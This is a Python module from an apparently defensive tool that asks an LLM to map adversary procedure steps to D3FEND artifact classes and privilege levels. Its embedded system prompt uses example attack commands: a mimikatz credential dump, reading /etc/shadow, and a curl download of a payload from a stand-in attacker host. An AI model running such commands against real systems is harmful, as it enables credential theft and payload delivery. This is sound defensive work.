"""D3FEND observable enrichment node."""

from pydantic import BaseModel, Field

from procedure_generator.d3fend.validator import (
    derive_telemetry_classes,
    validate_artifact_class,
)
from procedure_generator.llm import call_llm_structured
from procedure_generator.logger import get_logger
from procedure_generator.utils import merge_usage

logger = get_logger("enrich")


class StepObservablesLLM(BaseModel):
    """LLM output for a single step's observables."""

    step_id: int = Field(description="The step ID being analyzed")
    d3fend_observables: list[str] = Field(
        description="All D3FEND artifact classes that could be relevant to this technique"
    )
    execution_observables: list[str] = Field(
        description="Only the artifacts that actually occur given how this specific command executes"
    )
    execution_level: str = Field(
        description="'elevated' if requires admin/sudo/root, 'non-elevated' otherwise"
    )


class EnrichmentLLMResponse(BaseModel):
    """LLM response containing observables for all steps."""

    steps: list[StepObservablesLLM]


def _get_artifact_examples() -> str:
    """Get example artifact classes for the prompt."""
    return """Common D3FEND artifact classes (use exact names):
- Processes: Process, ExecutableBinary, ExecutableScript
- Files: File, LogFile, Directory, OperatingSystemConfigurationFile
- Network: NetworkTraffic, WebNetworkTraffic, URL, IPAddress, Hostname
- Windows: WindowsRegistryKey, WindowsRegistryValue
- Identity: UserAccount, Credential, Password, KerberosTicket, Certificate
- Logs: EventLog, CommandHistoryLog
- Persistence: ScheduledJob, Service
- IPC: NamedPipe
- Other: Email, Database, Session"""


ENRICHMENT_SYSTEM_PROMPT = """You are a cybersecurity expert analyzing adversary procedures to identify D3FEND digital artifacts and execution requirements.

For each action step, you must identify:

## 1. d3fend_observables (Theoretical/Defensive View)
These are ALL D3FEND artifact classes that COULD be relevant to this technique in general.
- Include artifacts that defenders would want to monitor for this type of attack
- Include artifacts that might appear in different implementations of this technique
- Think: "What could a defender monitor to detect this type of activity?"

## 2. execution_observables (Runtime Reality)
These are ONLY the artifacts that ACTUALLY OCCUR given the specific command.
- If the command writes to disk, include File
- If the command stays in memory, do NOT include File
- If the command makes network connections, include NetworkTraffic
- Think: "What telemetry will this specific command actually generate?"

## 3. execution_level (Privilege Requirement)
Determine if the command requires elevated privileges:
- "elevated": Requires admin, sudo, root, or SYSTEM privileges
- "non-elevated": Can run as a standard user

Indicators of ELEVATED execution:
- Commands prefixed with sudo
- Commands that modify system files (/etc/*, C:\\Windows\\*, /usr/*)
- Registry modifications to HKLM
- Service installation/modification
- User account creation or modification
- Firewall or security policy changes
- Kernel module loading
- Mounting filesystems
- Changing file ownership (chown)
- Package installation (apt, yum, pip with --system)

Indicators of NON-ELEVATED execution:
- Reading files in user-accessible locations
- Running user-space tools
- Network connections (unless binding to privileged ports < 1024)
- File operations in user home directory
- Environment variable manipulation

## Key Distinction Example
Technique: Credential Dumping (T1003)

If command is `mimikatz.exe sekurlsa::logonpasswords > creds.txt`:
- d3fend_observables: ["Process", "Credential", "File", "EventLog"]
- execution_observables: ["Process", "Credential", "File", "EventLog"] (writes to file)
- execution_level: "elevated" (requires admin to access LSASS)

If command is `cat /etc/shadow`:
- d3fend_observables: ["Process", "File", "Credential"]
- execution_observables: ["Process", "File", "Credential"]
- execution_level: "elevated" (shadow file requires root)

If command is `curl http://attacker.com/payload.sh`:
- d3fend_observables: ["Process", "NetworkTraffic", "File"]
- execution_observables: ["Process", "NetworkTraffic"]
- execution_level: "non-elevated" (standard user can make HTTP requests)

{artifact_examples}

## Rules
1. execution_observables is always a SUBSET of d3fend_observables
2. Process is almost always in execution_observables (commands execute as processes)
3. NetworkTraffic only in execution_observables if the command actually connects to network
4. File only in execution_observables if the command reads/writes files
5. Use valid D3FEND class names exactly as shown above
6. execution_level must be exactly "elevated" or "non-elevated" """


def _format_steps_for_prompt(steps: list[dict]) -> str:
    """Format action steps for the enrichment prompt."""
    lines = []
    for idx, step in enumerate(steps):
        # Use step_id if present, otherwise use index
        step_id = step.get("step_id", idx + 1)
        lines.append(f"Step {step_id}:")
        lines.append(f"  Tactic: {step.get('tactic', 'Unknown')}")
        lines.append(
            f"  Technique: {step.get('technique_id', 'Unknown')} - {step.get('technique_name', 'Unknown')}"
        )
        lines.append(f"  OS: {step.get('os', 'Unknown')}")
        lines.append(f"  Command: {step.get('command', 'N/A')}")
        lines.append(f"  Description: {step.get('description', 'N/A')}")
        lines.append("")
    return "\n".join(lines)


def _validate_and_fix_observables(
    observables: list[str],
) -> list[str]:
    """Validate and fix D3FEND observable class names."""
    fixed = []
    for obs in observables:
        _, corrected, _ = validate_artifact_class(obs)
        fixed.append(corrected)
    return sorted(set(fixed))


def enrich_node(state: dict) -> dict:
    """Extract D3FEND observables for each action step.

    Reads: input_procedure, model, usage
    Writes: step_observables, usage
    """
    logger.info("Extracting D3FEND observables...")

    input_procedure = state["input_procedure"]
    model = state["model"]

    # Handle both TTPOutput and FinalOutput structures
    if "procedure" in input_procedure:
        # FinalOutput structure
        action_sequence = input_procedure["procedure"]["action_sequence"]
    else:
        # TTPOutput structure
        action_sequence = input_procedure["action_sequence"]

    # Format steps for prompt
    steps_text = _format_steps_for_prompt(action_sequence)

    user_content = f"""Analyze the following adversary procedure steps and identify D3FEND observables and execution level for each.

{steps_text}

For each step, provide:
1. d3fend_observables: All artifacts relevant to the technique (defensive view)
2. execution_observables: Only artifacts that actually occur from this specific command (runtime view)
3. execution_level: "elevated" if requires admin/sudo/root, "non-elevated" otherwise"""

    system_prompt = ENRICHMENT_SYSTEM_PROMPT.format(artifact_examples=_get_artifact_examples())

    # Call LLM
    response, usage = call_llm_structured(
        system_prompt=system_prompt,
        user_content=user_content,
        model=model,
        response_format=EnrichmentLLMResponse,
    )

    # Validate step ID alignment between input and LLM response
    expected_step_ids = {step.get("step_id", idx + 1) for idx, step in enumerate(action_sequence)}
    returned_step_ids = {s.step_id for s in response.steps}

    missing = expected_step_ids - returned_step_ids
    extra = returned_step_ids - expected_step_ids
    if missing:
        logger.warning(f"LLM did not return observables for step IDs: {sorted(missing)}")
    if extra:
        logger.warning(f"LLM returned observables for unknown step IDs: {sorted(extra)}")

    logger.debug(
        f"Expected step IDs: {sorted(expected_step_ids)}, Returned: {sorted(returned_step_ids)}"
    )

    # Validate and fix observables, derive telemetry classes
    step_observables = []
    for step_obs in response.steps:
        d3fend_fixed = _validate_and_fix_observables(step_obs.d3fend_observables)
        exec_fixed = _validate_and_fix_observables(step_obs.execution_observables)

        # Ensure execution_observables is subset of d3fend_observables
        exec_fixed = [obs for obs in exec_fixed if obs in d3fend_fixed]

        # Derive telemetry classes from execution observables
        telemetry = derive_telemetry_classes(exec_fixed)

        # Normalize execution_level to valid values
        exec_level = step_obs.execution_level.lower().strip()
        if exec_level not in ("elevated", "non-elevated"):
            exec_level = "non-elevated"  # Default to non-elevated if invalid

        step_observables.append(
            {
                "step_id": step_obs.step_id,
                "d3fend_observables": d3fend_fixed,
                "execution_observables": exec_fixed,
                "telemetry_classes": telemetry,
                "execution_level": exec_level,
            }
        )

    logger.info(f"Enriched {len(step_observables)} steps with D3FEND observables")

    return {
        "step_observables": step_observables,
        "usage": merge_usage(state.get("usage"), usage),
    }
